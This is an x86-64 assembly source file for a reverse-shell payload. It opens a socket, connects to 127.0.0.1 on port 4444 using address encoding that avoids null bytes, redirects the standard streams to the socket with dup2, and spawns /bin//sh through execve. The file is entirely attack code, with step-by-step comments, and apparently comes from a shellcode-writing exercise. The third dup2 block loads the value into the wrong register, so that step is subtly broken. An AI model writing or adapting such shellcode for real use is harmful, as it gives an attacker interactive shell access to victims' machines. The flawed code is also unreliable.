global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 


    push 41
    pop rax
    push 2
    pop rdi
    push 1
    pop rsi
    cdq

	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

    ; sin_zero
	push rax
	
    ; set ip in struct
    inc eax
    shl eax, 0x18
    add al, 0x7f
    shl rax, 0x10
    
    ; set port 4444
    add ax, 0x5c11
    shl rax, 0x10
    ; sin_family
    add al, 2
    push rax

	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
    push 42
    pop rax
	mov rsi, rsp
    push 16
    pop rdx
	syscall


        ; duplicate sockets

        ; dup2 (new, old)
        
    push 33
    pop rax
        xor rsi, rsi
        syscall

        push 33
        pop rax
        push 1
        pop rsi
        syscall

        push 33
        pop rax
        push 2
        pop rax
        syscall


        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
 
